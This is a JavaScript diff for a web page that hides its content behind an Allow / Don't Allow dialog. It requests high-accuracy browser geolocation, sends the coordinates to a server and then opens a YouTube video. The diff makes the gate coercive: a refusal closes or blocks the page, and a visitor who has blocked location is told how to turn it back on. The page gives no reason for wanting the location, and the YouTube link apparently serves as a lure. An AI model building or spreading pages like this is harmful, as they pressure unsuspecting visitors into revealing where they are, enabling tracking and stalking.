@@ -1,17 +1,19 @@
 /**
- * Consent dialog → browser geolocation → save + open YouTube.
+ * Centered Allow / Don't Allow dialog (required before page content).
  *
- * - Profile stays visible until "Never allow".
- * - Custom popup is shown on every page load / reload.
- * - Continue always calls the Geolocation API (so the browser
- *   location options can appear whenever the browser allows it).
+ * - Page content stays hidden until location is allowed.
+ * - Allow → browser location request → save + show page + open YouTube.
+ * - Don't Allow (or browser deny) → close / block the page.
+ *
+ * Note: After tapping Allow, Android Chrome may still show its own
+ * system banner. That native UI cannot be moved or restyled by websites.
  */
 
 const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";
 
 const dialogEl = document.getElementById("consent-dialog");
-const continueBtn = document.getElementById("consent-continue");
-const notNowBtn = document.getElementById("consent-not-now");
+const allowBtn = document.getElementById("consent-continue");
+const denyBtn = document.getElementById("consent-not-now");
 const statusEl = document.getElementById("status");
 const pageContent = document.getElementById("page-content");
 const blockedEl = document.getElementById("blocked-screen");
@@ -21,13 +23,21 @@ function showDialog() {
   dialogEl.hidden = false;
   dialogEl.setAttribute("aria-hidden", "false");
   if (blockedEl) blockedEl.hidden = true;
+  document.body.classList.add("awaiting-choice");
   document.body.classList.remove("content-blocked");
-  if (pageContent) pageContent.hidden = false;
+  if (pageContent) pageContent.hidden = true;
 }
 
 function hideDialog() {
   dialogEl.hidden = true;
   dialogEl.setAttribute("aria-hidden", "true");
+}
+
+function revealPage() {
+  document.body.classList.remove("awaiting-choice");
+  document.body.classList.remove("content-blocked");
+  if (pageContent) pageContent.hidden = false;
+  if (blockedEl) blockedEl.hidden = true;
 }
 
 function setStatus(message, tone = "info") {
@@ -52,11 +62,22 @@ function openYouTube() {
   window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
 }
 
-function showBlockedScreen() {
+/** Don't Allow → hide everything and leave the page. */
+function closePage() {
   hideDialog();
   if (pageContent) pageContent.hidden = true;
-  if (blockedEl) blockedEl.hidden = false;
   document.body.classList.add("content-blocked");
+  document.body.classList.remove("awaiting-choice");
+
+  if (blockedEl) {
+    blockedEl.hidden = false;
+  }
+
+  try {
+    window.close();
+  } catch {
+    // ignore
+  }
 }
 
 async function sendLocationToServer(payload) {
@@ -82,8 +103,6 @@ function requestBrowserLocation() {
       return;
     }
 
-    // This is what triggers the browser "Allow / Never allow" popup
-    // (only if permission is not already set to denied).
     navigator.geolocation.getCurrentPosition(resolve, reject, {
       enableHighAccuracy: true,
       timeout: 20000,
@@ -113,16 +132,11 @@ function isDeniedError(error) {
   );
 }
 
-/** Continue → always request location so browser options can appear. */
-async function handleContinue() {
-  continueBtn.disabled = true;
-  notNowBtn.disabled = true;
-
-  // Do NOT skip the API call when denied — still attempt it.
-  // If the browser already saved "Never allow", it won't show UI again
-  // until the user resets site location permission.
+/** Allow → request location, then unlock page. */
+async function handleAllow() {
+  allowBtn.disabled = true;
+  denyBtn.disabled = true;
   hideDialog();
-  setStatus("Check the browser location popup…", "info");
 
   try {
     const position = await requestBrowserLocation();
@@ -135,48 +149,48 @@ async function handleContinue() {
     };
 
     await sendLocationToServer(payload);
+    revealPage();
     setStatus("You’re all set. Opening YouTube…", "ok");
     openYouTube();
   } catch (error) {
     console.error("Location flow error:", error);
 
     if (isDeniedError(error)) {
-      showBlockedScreen();
+      closePage();
       return;
     }
 
-    setStatus("Could not get your location. Please try Continue again.", "error");
+    setDialogHint("Could not get location. Please tap Allow again.");
     showDialog();
   } finally {
-    continueBtn.disabled = false;
-    notNowBtn.disabled = false;
+    allowBtn.disabled = false;
+    denyBtn.disabled = false;
   }
 }
 
-function handleNotNow() {
-  hideDialog();
-  setStatus("Refresh the page anytime to see the options again.", "info");
+/** Don't Allow → close / block the page (no content). */
+function handleDontAllow() {
+  closePage();
 }
 
 async function init() {
-  // Every load/reload shows the Open Youtube popup again.
+  // Centered Allow / Don't Allow dialog on every visit — content stays hidden.
   showDialog();
 
   const perm = await getGeoPermissionState();
   if (perm === "denied") {
     setDialogHint(
-      "Location is blocked for this site. On iPhone: aA or i icon → Website Settings → Location → Allow. On Android: lock icon → Permissions → Location → Allow. Then tap Continue."
+      "Location is blocked for this site. On iPhone: aA or i icon → Website Settings → Location → Allow. On Android: lock icon → Permissions → Location → Allow. Then tap Allow."
     );
   } else {
     setDialogHint("");
   }
 }
 
-continueBtn.addEventListener("click", handleContinue);
-notNowBtn.addEventListener("click", handleNotNow);
+allowBtn.addEventListener("click", handleAllow);
+denyBtn.addEventListener("click", handleDontAllow);
 
 document.getElementById("blocked-reload")?.addEventListener("click", () => {
-  // Hard reload so the consent popup shows again.
   window.location.href = `${window.location.pathname}?t=${Date.now()}`;
 });
 
